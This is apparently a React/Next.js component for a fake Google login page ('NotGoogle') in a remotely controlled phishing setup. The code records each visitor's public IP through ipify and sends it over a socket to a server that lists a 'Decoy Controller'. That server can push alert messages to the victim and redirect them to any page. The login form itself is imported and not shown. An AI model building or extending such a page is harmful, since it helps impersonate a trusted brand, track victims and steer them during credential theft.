'use client';
import { useEffect, useState } from "react";
import { socket } from "../socket.js";
import { useRouter } from "next/navigation";
import Login from '@/clientComponents/login/login';

const NotGoogle = () => {
  const [ipv4, setIpv4] = useState(null);
  const [isConnected, setIsConnected] = useState(false);
  const [transport, setTransport] = useState("N/A");
  const [userList, setUserList] = useState([]);
  const router = useRouter();

  useEffect(() => {
    if (socket.connected) {
      onConnect();
    }

    function onConnect() {
      setIsConnected(true);
      setTransport(socket.io.engine.transport.name);

      socket.io.engine.on("upgrade", (transport) => {
        setTransport(transport.name);
      });

      socket.emit("join", ipv4);
      socket.on("UserList", handleUserList);
    }

    function onDisconnect() {
      setIsConnected(false);
      setTransport("N/A");
      // Remove event listeners when disconnecting
      socket.off("alert", handleAlert);
      socket.off("pushToPage", handlePushToPage);
      socket.off("UserList", handleUserList);
    }

    // Define function to handle "UserList" event
    function handleUserList(userList) {
      userList = userList.filter(
        (user, index) => userList.indexOf(user) === index && user !== null
      );
      userList = userList.filter((user) => user !== "Decoy Controller");
      setUserList(userList);
    }
    function handleAlert(message) {
      console.log("Alerting user with message: ", message);
      alert(message);
    }

    function handlePushToPage(site) {
      router.push(site);
    }

    socket.on("connect", onConnect);
    socket.on("alert", handleAlert);
    socket.on("pushToPage", handlePushToPage);
    socket.on("disconnect", onDisconnect);

    return () => {
      socket.off("connect", onConnect);
      socket.off("alert", handleAlert);
      socket.off("pushToPage", handlePushToPage);
      socket.off("disconnect", onDisconnect);
      socket.off("UserList", handleUserList)
    };
  }, [ipv4, router]); // Only run this effect once on component mount

  useEffect(() => {
    const fetchIPv4 = async () => {
      try {
        const response = await fetch(`https://api.ipify.org?format=json`);
        if (!response.ok) {
          throw new Error("Failed to fetch IPv4 address");
        }
        const result = await response.json();
        setIpv4(result.ip);
        //console.log(result.ip);
      } catch (error) {
        console.error("Error fetching IPv4 address:", error.message);
      }
    };

    fetchIPv4();
  }, [router]);


  return (
    <div>
      <Login argument={"notGoogle"} />
    </div>
  );
};

export default NotGoogle;
